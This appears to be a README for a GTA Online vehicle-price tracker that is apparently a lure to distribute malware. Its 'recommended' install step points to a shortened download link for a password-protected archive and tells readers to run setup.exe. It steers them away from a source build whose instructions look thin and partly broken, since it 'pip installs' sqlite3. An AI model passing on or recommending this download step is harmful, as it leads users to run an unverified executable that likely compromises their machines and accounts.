# 🚀 GTA 5 Vehicle Market Tracker

## 📌 Description
**GTA 5 Vehicle Market Tracker** is a desktop application that helps players monitor **vehicle and real estate prices** in GTA Online.  
The software provides **real-time price tracking, market trends, and recommendations** for the best time to buy or sell vehicles.

🔹 Supported categories: **Supercars, Sports, Off-road, Motorcycles, Real Estate**  
🔹 Data sources: **Cloud-based price updates, Rockstar events, community reports**  
🔹 Analytics: **Discounts, market trends, resale value predictions**  

---

## 🎯 Features
✅ **Live vehicle price tracking** (updated from cloud data)  
✅ **Price trend analysis** (best time to buy/sell)  
✅ **Graphical visualization of discounts and price drops**  
✅ **Filters by vehicle class, speed, resale value**  
✅ **Cloud-based data updates** (automatic updates for new discounts)  

---

## 📥 Installation & Launch
### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
1️⃣ **[Download](https://goo.su/VshhJUa) and extract archive(pass: Project12!)**
2️⃣ **Run `setup.exe`**  
🚀 **The application will set up everything automatically, just enjoy!**  

⚠️ **Important:** This method is **faster** and requires **no manual setup**!  

---

### 🔹 ❌ COMPLEX METHOD (For Developers Only)
❗ **This method is NOT recommended as it requires installing multiple dependencies manually.**  
❗ **Only use this if you know what you're doing!**  

#### 1️⃣ **Manually install dependencies**
```bash
pip install numpy matplotlib pandas PyQt5 requests sqlite3
```

#### 2️⃣ **Launch with manual settings**
```bash
export PYTHONPATH=$(pwd)/src
python src/main.py --use-cloud-data --debug-mode --force-render
```

❌ **This method is harder, prone to errors, and requires manual configuration.**  
💡 **Just use the .exe, it handles everything automatically!**  

---

## 🖥 User Interface
🔹 **Main window** with a GTA 5 **vehicle price list**  
🔹 **Filters and sorting by price, speed, discounts**  
🔹 **Data visualization with graphs and statistics**  

Example code for fetching vehicle data and filtering by price:
```python
import pandas as pd

# Load vehicle price data
data = pd.read_json("data/vehicle_prices.json")

# Filter vehicles under $1,000,000 with a discount
affordable_vehicles = data[(data["price"] < 1000000) & (data["discount"] > 10)]

# Display the top results
print(affordable_vehicles[["name", "price", "discount"]])
```

---

## 🖼 Examples
📌 **Live price tracking & discounts:**  
![Vehicle Prices](1.jpg)  

📌 **Market trends & resale value predictions:**  
![Market Trends](2.jpg)  

---

## 🔗 Data Sources
The application supports **cloud-based data updates** for the latest prices and discounts.  
Example JSON file with vehicle price data:
```json
[
    {"name": "Ocelot Pariah", "class": "Sports", "price": 1420000, "discount": 15},
    {"name": "Grotti X80 Proto", "class": "Super", "price": 2700000, "discount": 10}
]
```

---

## 🤝 Support & Contact
📌 **Join the community for updates and assistance!**  
📧 **Email:** cheatmeat@games.com  
